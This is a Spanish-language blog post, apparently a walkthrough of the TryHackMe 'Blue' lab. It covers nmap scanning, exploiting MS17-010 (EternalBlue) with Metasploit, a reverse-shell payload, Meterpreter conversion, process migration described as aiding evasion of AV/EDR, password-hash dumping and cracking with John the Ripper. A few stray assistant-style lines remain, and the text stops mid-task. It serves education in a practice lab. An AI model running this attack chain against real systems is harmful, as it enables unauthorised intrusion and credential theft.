---
layout: post
title: "WriteUp - Try Hack Me"
---

# WriteUp: Blue | TryHackMe

## Introducci√≥n

La m√°quina **Blue** de [TryHackMe](https://tryhackme.com/room/blue) es un reto de nivel principiante dise√±ado para introducir al usuario en el uso de herramientas de escaneo y explotaci√≥n b√°sica. El objetivo principal de este laboratorio es explotar una vulnerabilidad cr√≠tica en sistemas Windows: **MS17-010**, com√∫nmente conocida como **EternalBlue**.

Este WriteUp documenta paso a paso el proceso seguido para identificar y explotar la vulnerabilidad, incorporando tambi√©n los fundamentos te√≥ricos necesarios para su comprensi√≥n. Se detallan las herramientas utilizadas, el razonamiento detr√°s de cada acci√≥n y las lecciones aprendidas a lo largo del ejercicio.

## Metodolog√≠a de desarrollo

Antes de comenzar con el reconocimiento activo, es importante adoptar una metodolog√≠a organizada. Documentar cada hallazgo te permitir√° tener un mejor control del an√°lisis y facilitar√° el seguimiento l√≥gico durante todo el laboratorio.

Te recomiendo mantener un archivo de notas (puede ser un bloc de notas, Obsidian, CherryTree, Notion, etc.) donde registres informaci√≥n clave como:

- IP de la m√°quina objetivo
- Puertos abiertos y servicios detectados
- Versiones de software en ejecuci√≥n
- Vulnerabilidades identificadas
- Comandos ejecutados y sus resultados

> üìù Una buena documentaci√≥n no solo mejora tu productividad, tambi√©n te entrena para aplicar buenas pr√°cticas profesionales en entornos reales de pentesting.

## Desarrollo y AN√ÅLISIS del laboratorio

Primero debemos de tener en cuenta frases importante que se nos comparte en la descripci√≥n del laboratorio:

> Escanee y descubra a qu√© exploit es vulnerable esta m√°quina. Tenga en cuenta que esta m√°quina no responde a pings (ICMP) y puede tardar unos minutos en iniciarse.¬†**Esta sala no est√° dise√±ada para ser un CTF de boot2root, sino una serie educativa para principiantes.**
### Explicaci√≥n por partes:

1) **"Escanee y descubra a qu√© exploit es vulnerable esta m√°quina."**

Esto significa que debemos de usar t√©cnicas de **reconocimiento y escaneo de vulnerabilidades** (por ejemplo, con `nmap`) para identificar alguna **vulnerabilidad conocida** en el sistema objetivo. Luego, con base en esa informaci√≥n, buscar un exploit espec√≠fico que la aproveche.

2) **"Tenga en cuenta que esta m√°quina no responde a pings (ICMP)..."**

La m√°quina **no responde a paquetes ping** (ICMP), por lo tanto, comandos como:
 
```bash
ping <IP>
```

...no funcionar√°n.

3) **"Esta sala no est√° dise√±ada para ser un CTF de boot2root..."**

Un **CTF boot2root** es un reto en el que empiezas con acceso nulo y tu objetivo es llegar a ser `root` (administrador) del sistema. Aqu√≠ te dicen que **ese no es el objetivo principal**, sino **entender c√≥mo funciona un exploit espec√≠fico**.

---

### Task 1: Recon

#### 1. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the [Nmap](https://tryhackme.com/room/furthernmap) room)

> **Traducci√≥n de la pregunta:**  
> Escanea la m√°quina. (Si no est√°s seguro de c√≥mo hacerlo, te recomiendo revisar la sala de [Nmap](https://tryhackme.com/room/furthernmap)).

---

##### Objetivo del escaneo

Como primer paso, debemos realizar un escaneo a la m√°quina v√≠ctima para identificar posibles **vulnerabilidades** explotables. De acuerdo con el an√°lisis previo del laboratorio, el prop√≥sito principal es detectar alguna debilidad espec√≠fica del sistema, por lo que el escaneo debe estar enfocado en identificar servicios vulnerables.

---

##### Comando utilizado

```bash
sudo nmap -sV -Pn --script=vuln <IP_de_la_m√°quina_v√≠ctima>
```

##### Desglose de opciones:

- **`-Pn`** ‚Äì _Omitir detecci√≥n de host_  
    Indica a Nmap que **no realice ping** para verificar si el host est√° activo. Esto es √∫til si el firewall de la m√°quina v√≠ctima bloquea respuestas ICMP o si simplemente queremos forzar el escaneo de puertos.
    
- **`-sV`** ‚Äì _Detecci√≥n de versiones de servicios_  
    Permite identificar qu√© servicios est√°n corriendo en los puertos abiertos, as√≠ como sus versiones, lo que es esencial para buscar vulnerabilidades espec√≠ficas asociadas a esos servicios.
    
- **`--script=vuln`** ‚Äì _Ejecuci√≥n de scripts de vulnerabilidades conocidos_  
    Ejecuta una serie de scripts NSE (Nmap Scripting Engine) que intentan detectar **vulnerabilidades conocidas** en los servicios detectados, como versiones sin parches o configuraciones inseguras.

---

##### Resultado esperado

El escaneo debe proporcionarnos una lista de puertos abiertos, servicios en ejecuci√≥n y posibles vulnerabilidades asociadas. Esta informaci√≥n ser√° clave para seleccionar un exploit adecuado en la siguiente etapa del laboratorio.

---

#### 2. How many ports are open with a port number under 1000?

> **Traducci√≥n de la pregunta:**  
> ¬øCu√°ntos puertos est√°n abiertos con un n√∫mero de puerto menor a 1000?

---

##### Objetivo de la pregunta

El prop√≥sito es identificar cu√°ntos puertos abiertos tienen un n√∫mero inferior a **1000**, es decir, dentro del **rango de puertos conocidos o ‚Äúwell-known ports‚Äù** (0‚Äì1023). Estos puertos suelen estar asociados a servicios esenciales del sistema.

---

##### An√°lisis del resultado del escaneo Nmap

Una vez finalizado el escaneo, se presenta la siguiente informaci√≥n:

```bash
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49158/tcp open  msrpc          Microsoft Windows RPC
49159/tcp open  msrpc          Microsoft Windows RPC
```

---

##### Filtrado de puertos menores a 1000

De los puertos listados, los siguientes cumplen la condici√≥n:

- **135/tcp**
    
- **139/tcp**
    
- **445/tcp**
    

Esto nos da un **total de 3 puertos abiertos** con n√∫mero menor a 1000.

---
#### 3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

> **Traducci√≥n de la pregunta:**  
> ¬øA qu√© es vulnerable esta m√°quina? (Respuesta en formato: ms??-???, ej.: ms08-067)

---

##### Objetivo de la pregunta

El prop√≥sito es identificar una **vulnerabilidad espec√≠fica** (normalmente con el formato MSXX-XXX) que afecte a la m√°quina escaneada. Este tipo de vulnerabilidades suelen ser utilizadas en exploits ampliamente conocidos.

---

##### An√°lisis de la salida del escaneo Nmap

En la secci√≥n correspondiente a los scripts NSE aplicados al servicio SMB, se observa el siguiente resultado:

```bash
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

Esto indica claramente que el sistema es vulnerable a:

- **MS17-010**, una vulnerabilidad cr√≠tica de **ejecuci√≥n remota de c√≥digo (RCE)** en el protocolo SMBv1 de Windows.


---

##### Contexto adicional

La vulnerabilidad **MS17-010** es famosa por haber sido utilizada por el exploit **EternalBlue**, empleado en ataques como **WannaCry**. Afecta a versiones no parchadas de Windows que usan SMBv1.

**Respuesta final:** ms17-010

---

### Task 2: Gain Access

#### 1. Start¬†[Metasploit](https://tryhackme.com/module/metasploit)
   
> **En espa√±ol**
> Inicia Metasploit

- En este caso, para iniciar Metasploit ejecutamos el siguiente comando: `sudo msfconsole`
- Una vez cargado metasploit, nos aparecer√° lo siguiente:

![](/assets/img2/20250513193412.png)

---
#### 2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

> **Traducci√≥n de la pregunta:**  
> Encuentra el c√≥digo de explotaci√≥n que ejecutaremos en la m√°quina. ¬øCu√°l es la ruta completa del c√≥digo? (Ej.: exploit/........)

---
##### Objetivo de la pregunta

Esta pregunta busca identificar el **m√≥dulo de explotaci√≥n exacto** que utilizaremos dentro de Metasploit para explotar la vulnerabilidad descubierta en la m√°quina (MS17-010).

---
##### Procedimiento para encontrar el exploit

1. Abrimos Metasploit y utilizamos el siguiente comando para buscar m√≥dulos relacionados con la vulnerabilidad:
    
```bash
search ms17-010
```
    
2. La b√∫squeda arroja m√∫ltiples resultados, entre los cuales destacan varios m√≥dulos de tipo `exploit`, `auxiliary` y `scanner`.
    
3. Entre ellos, el m√°s relevante para nuestro caso es:
    
```bash
exploit/windows/smb/ms17_010_eternalblue
```

Este m√≥dulo explota la vulnerabilidad **MS17-010** utilizando el exploit **EternalBlue**, que permite la ejecuci√≥n remota de c√≥digo (RCE) en sistemas Windows a trav√©s del servicio SMBv1.

---
##### ¬øPor qu√© elegir este m√≥dulo?

- El escaneo de Nmap revel√≥ que la m√°quina objetivo es **Windows**.
    
- El puerto **445 (SMB)** est√° abierto.
    
- Se confirm√≥ que la vulnerabilidad presente es **ms17-010**.
    
- EternalBlue es un exploit probado y efectivo para esta vulnerabilidad en entornos Windows compatibles.

---

##### Respuesta final: `exploit/windows/smb/ms17_010_eternalblue`

---

#### 3. Show options and set the one required value. What is the name of this value? (All caps for submission)

> **Traducci√≥n de la pregunta:**  
> Mostrar las opciones y establecer el valor requerido. ¬øC√≥mo se llama este valor? (Escribe la respuesta en may√∫sculas)

---

##### Objetivo de la pregunta

Identificar cu√°l es el **valor obligatorio** que debemos configurar para poder ejecutar correctamente el exploit seleccionado en Metasploit.

---

##### Procedimiento

1. **Seleccionar el m√≥dulo de explotaci√≥n**  
    Una vez identificado el exploit (`exploit/windows/smb/ms17_010_eternalblue`), lo activamos con:
    
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```
    
    Tambi√©n se puede usar el √≠ndice del m√≥dulo (por ejemplo, `use 0`) si fue el primer resultado al buscar con `search`.
    
    ![](/assets/img2/20250513195300.png)

2. **Mostrar las opciones de configuraci√≥n**  
    Ejecutamos:
    
```bash
show options
```

![](/assets/img2/20250513195449.png)

3. **Analizar los par√°metros requeridos**  
    En la tabla de opciones que aparece, se identifican todos los par√°metros necesarios para que el m√≥dulo funcione correctamente.  
    Entre ellos, se destacan los que tienen el campo `Required` en **"yes"** y a√∫n no tienen un valor asignado.
    

---

##### Par√°metro requerido: `RHOSTS`

- Este valor representa la **IP de la m√°quina v√≠ctima**.
    
- Debe ser configurado manualmente con el siguiente comando:
    
```bash
set RHOSTS <IP_de_la_m√°quina>
```
    
- Luego puedes verificar que fue asignado correctamente con:
    
```bash
show options
```

- **Respuesta final:** RHOSTS

---
#### 4. Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter: `set payload windows/x64/shell/reverse_tcp`

> **Traducci√≥n de la pregunta:**  
> Normalmente se podr√≠a ejecutar el exploit tal cual, pero con fines de aprendizaje conviene hacer un ajuste antes. Introduce el siguiente comando y presiona Enter:  
> `set payload windows/x64/shell/reverse_tcp`

---

##### Objetivo de la pregunta

El objetivo es **cambiar el payload** que se usar√° en la explotaci√≥n. Esto permite experimentar con diferentes tipos de acceso que Metasploit puede generar al comprometer el sistema objetivo.

---
##### ¬øQu√© es un payload?

Un **payload** es el c√≥digo que se ejecutar√° en el sistema v√≠ctima una vez que la vulnerabilidad haya sido explotada con √©xito. Puede ser:

- Una simple shell reversa
    
- Una sesi√≥n Meterpreter
    
- Un comando espec√≠fico, entre otros

---

##### ¬øQu√© estamos haciendo aqu√≠?

1. Por defecto, el m√≥dulo de explotaci√≥n carga el payload:
    
    ```
    windows/x64/meterpreter/reverse_tcp
    ```
    
2. Sin embargo, en este caso, TryHackMe solicita cambiarlo por un payload m√°s simple:
    
    ```
    windows/x64/shell/reverse_tcp
    ```
    
    Esto se hace ejecutando el siguiente comando en Metasploit:
    
    ```bash
    set payload windows/x64/shell/reverse_tcp
    ```
    
3. Para verificar que el cambio se aplic√≥ correctamente, puedes volver a usar:
    
    ```bash
    show options
    ```
    
    All√≠ ver√°s que el payload activo ahora es `windows/x64/shell/reverse_tcp`.

---

##### Conclusi√≥n

Este cambio no es obligatorio para ejecutar el exploit, pero permite entender c√≥mo se configura manualmente un payload diferente en Metasploit.

---

Aqu√≠ tienes una versi√≥n mejorada y profesionalmente estructurada de la **pregunta 7 del CTF**, siguiendo el mismo estilo t√©cnico:

---

#### 5. With that done, run the exploit!

> **Traducci√≥n de la pregunta:**  
> ¬°Una vez hecho esto, ejecuta el exploit!

---

##### Objetivo de la pregunta

El objetivo es lanzar el exploit despu√©s de haber configurado correctamente todos los par√°metros necesarios, incluyendo el payload y las direcciones IP requeridas.

---

##### Ejecuci√≥n del exploit

Una vez que ya:

- Has seleccionado el exploit adecuado
    
- Has configurado `RHOSTS` con la IP de la m√°quina v√≠ctima
    
- Has cambiado el payload a `windows/x64/shell/reverse_tcp`
    

Entonces puedes ejecutar el exploit con:

```bash
run
```

o tambi√©n:

```bash
exploit
```

---

##### Consideraciones importantes antes de ejecutar

üîπ Si est√°s usando **una m√°quina externa** (como tu propia Kali Linux):

1. Debes asegurarte de que la m√°quina pueda comunicarse con la red de TryHackMe (usualmente a trav√©s de **OpenVPN** o **WireGuard**).
    
2. Para ello, verifica tu interfaz de red con:
    
    ```bash
    ifconfig
    ```
    
3. Identifica la interfaz conectada a la VPN (com√∫nmente `tun0`).
    
4. Luego configura `LHOST` con la IP de esa interfaz:
    
    ```bash
    set LHOST <tu_IP_tun0>
    ```

üîπ Si est√°s usando el **AttackBox de TryHackMe**:

- No necesitas cambiar el valor de `LHOST`, ya que el entorno ya est√° configurado autom√°ticamente para funcionar dentro de la red de TryHackMe.

---
#### 6. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

> **Traducci√≥n de la pregunta:**  
> Confirma que el exploit se haya ejecutado correctamente. Es posible que tengas que presionar **Enter** para que aparezca el shell de DOS. Luego, env√≠a esta shell a segundo plano con **Ctrl + Z**. Si falla, intenta ejecutar el exploit nuevamente antes de reiniciar la m√°quina virtual de destino.

---

##### Objetivo de la pregunta

Verificar que la explotaci√≥n fue exitosa y que se ha obtenido una **shell remota** en el sistema v√≠ctima, permitiendo interactuar con √©l a trav√©s de comandos. Luego, se debe **enviar esta shell a segundo plano** para continuar trabajando con Metasploit.

---

##### ¬øQu√© sucede si el exploit funciona?

- Si el exploit se ejecuta con √©xito, ver√°s que Metasploit te muestra un mensaje como:
    
    ```
    Command shell session 1 opened [...]
    ```
    
- Si no aparece nada inmediatamente, presiona **Enter** una o dos veces para forzar la aparici√≥n del s√≠mbolo del sistema (prompt), t√≠pico en una shell de DOS (ejemplo: `C:\Windows\System32>`).

---

##### Enviar la sesi√≥n a segundo plano

Una vez confirmada la shell, usa la combinaci√≥n de teclas:

```bash
CTRL + Z
```

Metasploit te preguntar√° si deseas enviar la sesi√≥n al background. Escribe:

```bash
y
```

Y la sesi√≥n ser√° almacenada y numerada como activa, permitiendo ejecutar m√≥dulos post-explotaci√≥n.

---
##### ¬øQu√© hacer si la explotaci√≥n falla?

Si no obtienes shell:

1. Verifica que el **RHOSTS** y el **LHOST** est√©n correctamente configurados.
    
2. Intenta ejecutar nuevamente el exploit con `run`.
    
3. Si sigue sin funcionar, considera **reiniciar la m√°quina v√≠ctima** desde la plataforma y reintentar la explotaci√≥n.

### Task 3: Escalate

#### 1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

>**En espa√±ol**
>Si a√∫n no lo has hecho, activa el shell previamente obtenido (CTRL + Z). Investiga en l√≠nea c√≥mo convertir un shell a un shell de meterpreter en Metasploit. ¬øC√≥mo se llama el m√≥dulo de publicaci√≥n que usaremos? (La ruta exacta, similar al exploit que seleccionamos previamente).

Para **convertir una shell b√°sica a una sesi√≥n Meterpreter** dentro de Metasploit, se utiliza un m√≥dulo _post-explotaci√≥n_ dise√±ado espec√≠ficamente para este prop√≥sito.

---
##### ¬øQu√© hace este m√≥dulo?

Este m√≥dulo **inyecta una carga √∫til de Meterpreter** en una sesi√≥n de shell ya establecida (como la que obtuviste con `windows/x64/shell/reverse_tcp`), permiti√©ndote aprovechar todas las funcionalidades avanzadas de Meterpreter (como captura de pantalla, keylogging, pivoting, etc.).

---

##### M√≥dulo requerido

El nombre **exacto** del m√≥dulo que debes usar es:

```bash
post/multi/manage/shell_to_meterpreter
```

#### 2. Select this (use MODULE_PATH). Show options, what option are we required to change?

>**En espa√±ol**
>Seleccione esto (use MODULE_PATH). Mostrar opciones: ¬øqu√© opci√≥n debemos cambiar?

1. Aseg√∫rate de que tienes la sesi√≥n activa en background (verificada con `sessions`).
    
2. Carga el m√≥dulo:
    
```bash
use post/multi/manage/shell_to_meterpreter
```

3. Verifica la configuraci√≥n con:

```bash
msf6 post(multi/manage/shell_to_meterpreter) > show options 

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.
```

4. **Respuesta:** la opci√≥n requerida a modificar es "SESSION"

#### 3. Set the required option, you may need to list all of the sessions to find your target here.

>**En espa√±ol**
>Establezca la opci√≥n requerida, es posible que necesite enumerar todas las sesiones para encontrar su objetivo aqu√≠.

1. Vuelve a verificar la sesi√≥n con:

```bash
sessions
```

2. Asigna el ID de la sesi√≥n obtenida con el exploit:

```bash
set SESSION <ID>
```

4. Ejecuta el m√≥dulo:
    
    ```bash
    run
    ```
    
5. Si es exitoso, ver√°s una nueva sesi√≥n Meterpreter activa.

6. Una vez que ya verificaste la nueva sesi√≥n, selecciona esa sesi√≥n para su uso con:

```bash
sessions <n√∫mero_de_sesi√≥n>
```

---

#### 4. Verify that we have escalated to `NT AUTHORITY\SYSTEM`. Run `getsystem` to confirm this. Feel free to open a DOS shell via the command `shell` and run `whoami`. This should return that we are indeed SYSTEM. Background this shell afterwards and select our meterpreter session for usage again.

> **Traducci√≥n:**  
> Verifique que hayamos escalado privilegios a `NT AUTHORITY\SYSTEM`. Ejecute `getsystem` para confirmarlo. Si desea, abra una consola de DOS con el comando `shell` y ejecute `whoami`. Esto deber√≠a confirmar que tenemos privilegios de **SYSTEM**. Luego, regrese la shell al segundo plano y retome el control de la sesi√≥n Meterpreter.

---

##### Paso 1: Verificaci√≥n con `getsystem`

Dentro de la sesi√≥n de Meterpreter, ejecutamos:

```bash
meterpreter > getsystem
```

Resultado:

```
[-] Already running as SYSTEM
```

> Este mensaje indica que **ya estamos operando con privilegios de SYSTEM**, por lo que no es necesario realizar una escalada adicional.

---

##### Paso 2: Confirmaci√≥n manual con `whoami`

Para validarlo, accedimos a una shell del sistema con el comando:

```bash
meterpreter > shell
```

Y ejecutamos:

```bash
C:\Windows\system32> whoami
```

Resultado:

```
nt authority\system
```

> Este resultado **confirma plenamente** que la sesi√≥n activa tiene privilegios de `NT AUTHORITY\SYSTEM`.

---

##### Paso 3: Enviar la shell al segundo plano

Se ejecut√≥:

```bash
^Z
```

Y se acept√≥ enviar el canal al fondo:

```bash
Background channel 1? [y/N]  y
```

> Esto devuelve el control a la sesi√≥n de Meterpreter, lista para ejecutar otras acciones post-explotaci√≥n.

#### 5. **List all of the processes running via the `ps` command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at `NT AUTHORITY\SYSTEM` and write down the process ID (far left column).**

> **Traducci√≥n:**  
> Enumere todos los procesos en ejecuci√≥n con el comando `ps`. El hecho de que seamos SYSTEM no significa que **el proceso actual** desde el que operamos tambi√©n lo sea. Encuentre un proceso (preferiblemente hacia el final de la lista) que se est√© ejecutando como `NT AUTHORITY\SYSTEM` y anote su ID (columna izquierda).

---
##### Objetivo

El objetivo es identificar un **proceso propiedad de SYSTEM** dentro del sistema, que podamos utilizar para migrar nuestra sesi√≥n de Meterpreter y as√≠ ejecutar futuras acciones de forma m√°s estable o con menos restricciones.

---
##### Procedimiento

1. Desde la sesi√≥n de Meterpreter, ejecutamos:
    
```bash
ps
```
    
2. Este comando muestra una tabla con los procesos activos en el sistema, incluyendo:
    
    - PID (Process ID)
        
    - Nombre del ejecutable
        
    - Nombre del usuario propietario
        
3. Buscamos un proceso que:
    
    - Perteneciente a `NT AUTHORITY\SYSTEM`
        
    - Preferentemente no sea cr√≠tico para el sistema (como `lsass.exe`, que no se recomienda migrar)
        
    - Aparezca hacia la parte inferior de la lista (suelen ser procesos m√°s recientes o menos esenciales)
        

---

##### Importancia

Aunque la **sesi√≥n** est√© en contexto SYSTEM, el proceso desde el que fue lanzado puede no estarlo. Migrar a un proceso leg√≠timo ejecutado por SYSTEM refuerza la persistencia, estabilidad y evasi√≥n de defensas.

---

##### Acci√≥n a seguir

- Identifica el proceso adecuado y **anota el `PID`**.

Aqu√≠ tienes una redacci√≥n t√©cnica y estructurada para documentar correctamente la **pregunta 11 del CTF**:

---

#### 6. Migrate to this process using the `migrate PROCESS_ID` command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.**

> **Traducci√≥n:**  
> Migre a este proceso utilizando el comando `migrate PROCESS_ID`, donde el ID de proceso es el que anotaste en el paso anterior. Esta operaci√≥n puede requerir varios intentos, ya que la migraci√≥n no siempre es estable. Si falla, puede que tengas que repetir la conversi√≥n a Meterpreter o reiniciar la m√°quina v√≠ctima. Si ocurre, prueba con un proceso distinto la pr√≥xima vez.

---

##### Objetivo de la actividad

El prop√≥sito es **migrar la sesi√≥n de Meterpreter** a un proceso leg√≠timo que est√© ejecut√°ndose con privilegios de `NT AUTHORITY\SYSTEM`. Esto mejora:

- La **estabilidad** de la sesi√≥n
    
- La **persistencia**
    
- La capacidad de **evadir herramientas de defensa** (EDR, AV)
    

---

##### Procedimiento

1. Identifica el `PID` del proceso que seleccionaste en el paso anterior (por ejemplo, `1348`).
    
2. En la consola de Meterpreter, ejecuta el siguiente comando:
    
    ```bash
    migrate 1348
    ```
    
3. Si la migraci√≥n es exitosa, ver√°s un mensaje como:
    
    ```
    [*] Migrating from 1924 to 1348...
    [+] Migration completed successfully.
    ```
    
4. Si falla, podr√≠as ver mensajes como:
    
```
[-] Error running command migrate: Rex::Post::Meterpreter::RequestError: Operation failed: Access is denied.
```


---
##### Sugerencias en caso de error

- Prueba con **otro proceso SYSTEM** distinto.
    
- Evita procesos sensibles como `lsass.exe`, `winlogon.exe` o `csrss.exe` (migrar a estos puede causar inestabilidad o crash del sistema).
    
- Si ya migraste antes desde una shell, puedes **repetir el proceso de conversi√≥n** (`post/multi/manage/shell_to_meterpreter`).
    
- Como √∫ltimo recurso, **reinicia la m√°quina v√≠ctima** desde la plataforma y repite el proceso desde el principio.
    

---

##### Resultado esperado

Una vez migrado con √©xito, la sesi√≥n de Meterpreter estar√° ejecut√°ndose bajo un proceso del sistema, consolidando as√≠ el control total del host comprometido.

---

### Task 4: Cracking

Aqu√≠ tienes una redacci√≥n clara, t√©cnica y ordenada para documentar la **pregunta 12 del CTF**:

---

#### 1. Within our elevated meterpreter shell, run the command `hashdump`. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

> **Traducci√≥n:**  
> Dentro de nuestra sesi√≥n de Meterpreter con privilegios elevados, ejecuta el comando `hashdump`. Este comando volcar√° todas las contrase√±as almacenadas en el sistema, siempre que tengamos los permisos necesarios. ¬øCu√°l es el nombre del usuario **no predeterminado**?

---

##### Objetivo

El prop√≥sito es **identificar un usuario personalizado** creado en la m√°quina (distinto de los usuarios predeterminados de Windows), mediante el volcado de hashes de contrase√±as.

---

##### Procedimiento

1. En tu sesi√≥n de Meterpreter, ejecuta:
    
```bash
hashdump
```
    
2. El comando devolver√° una lista de usuarios con sus respectivos hashes. Por ejemplo:
    
```bash
Administrator:xxx:xxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxx:::
Guest:xxx:xxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxx:::
john:xxxx:xxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxx:::
```
    
3. Los usuarios predeterminados de Windows suelen ser:
    
    - `Administrator`
        
    - `Guest`
        
    - (Opcionalmente) `DefaultAccount`, `WDAGUtilityAccount`, etc.
        
4. Cualquier otro nombre (por ejemplo: `john`, `pedro`, `pepito`, `admin2`, etc.) se considera **no predeterminado**.

#### 2. Copy this password hash to a file and research how to crack it. What is the cracked password? 

>**En espa√±ol** 
>Copia este hash de contrase√±a a un archivo e investiga c√≥mo descifrarlo. ¬øCu√°l es la contrase√±a descifrada?

##### Crackear un hash NTLM con John the Ripper
##### Paso 1: Crear el archivo de hash

Crea un archivo llamado `hash.txt` y coloca en √©l la l√≠nea completa del hash encontrado:

```bash
john:xxxx:xxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxx:::
```

Ejemplo usando terminal:

```bash
echo 'john:xxxx:xxxxxxxxxxxxx:xxxxxxxxxxxxxxxx:::' > hash.txt
```

---
##### Paso 2: Verificar el formato con John

John puede detectar el formato autom√°ticamente si el archivo tiene la estructura adecuada (como la que produce `hashdump`).

O puedes especificarlo manualmente con `--format=NT` si quieres forzar que lo tome como hash NTLM:

```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

>**ALERTA**
>En **Kali Linux**, el archivo `rockyou.txt` **no est√° listo para usar por defecto** ‚Äî viene **comprimido** como `rockyou.txt.gz`.

###### ¬øD√≥nde est√° ubicado?

Por defecto, est√° en:

```
/usr/share/wordlists/rockyou.txt.gz
```

---

###### ¬øQu√© hacer?

Debes **descomprimirlo una vez** antes de poder usarlo con John o Hashcat.

Ejecuta:

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

> Esto reemplazar√° el `.gz` con el archivo descomprimido `rockyou.txt` en la misma ruta.

---

###### Resultado

Despu√©s de eso, podr√°s usarlo directamente con:

```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

#### Paso 3: Ver el resultado

Una vez que John termine de procesar el hash, puedes ver la contrase√±a crackeada con:

```bash
john --show hash.txt
```

### Task 5: Find flags!

Encuentra las tres banderas colocadas en esta m√°quina. No son banderas tradicionales, sino que representan ubicaciones clave dentro del sistema Windows. ¬°Usa las pistas a continuaci√≥n para completar esta sala!

#### 1. Flag1?¬†_This flag can be found at the system root._

>**En espa√±ol**
>Bandera 1:¬†_Esta bandera se encuentra en la ra√≠z del sistema._

---
##### ¬øQu√© significa ‚Äúra√≠z del sistema‚Äù en Windows?

Se refiere normalmente a:

```
C:\
```

Es decir, el **directorio ra√≠z** del disco donde est√° instalado el sistema operativo.

---

##### ¬øQu√© hacer?

Desde la **sesi√≥n de Meterpreter**, puedes hacer lo siguiente:

#### Usando comandos internos de Meterpreter

```bash
cd C:\
ls
```

Busca archivos con nombres como:

- `flag1.txt`
    
- `flag.txt`
    
- `root.txt`
    
- `FLAG1`, etc.

#### 2. Flag2?¬†_This flag can be found at the location where passwords are stored within Windows._ *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.

>**En espa√±ol**
>Bandera 2:¬†_Esta bandera se encuentra en la ubicaci√≥n donde se almacenan las contrase√±as en Windows._ *Erratas: A Windows no le gusta la ubicaci√≥n de esta bandera y, ocasionalmente, puede eliminarla. En algunos casos, puede ser necesario cerrar/reiniciar el equipo y volver a ejecutar el exploit para encontrarla. Si bien esto es relativamente poco frecuente, puede ocurrir.

##### ¬øD√≥nde guarda Windows las contrase√±as?

Las contrase√±as de usuarios locales en Windows se almacenan en el archivo **`SAM` (Security Account Manager)**, ubicado en:

```
C:\Windows\System32\config\SAM
```

Pero **no puede leerse directamente** desde un usuario normal o incluso desde una shell com√∫n, ya que est√° protegido por el sistema.

---
##### ¬øD√≥nde buscar la bandera?

`C:\Windows\System32\config\`

- Esta es la carpeta donde est√° el archivo `SAM`.
- Comando desde Meterpreter:


```bash
cd C:\\Windows\\System32\\config
ls
```

Busca un archivo como `flag2.txt`, `flag.txt`, o similar.

###### ¬øY si no aparece?

Si no encuentras el archivo:

- Puede que Windows lo haya eliminado (como advierte el mensaje).
    
- Reinicia la m√°quina v√≠ctima desde la plataforma.
    
- Vuelve a ejecutar el exploit y repite la b√∫squeda.

#### 3. flag3?¬†_This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._

>**En espa√±ol**
>¬øBandera 3?¬†_Esta bandera se encuentra en un lugar excelente para saquear. Al fin y al cabo, los administradores suelen tener cosas bastante interesantes guardadas._

##### Interpretaci√≥n de la pista

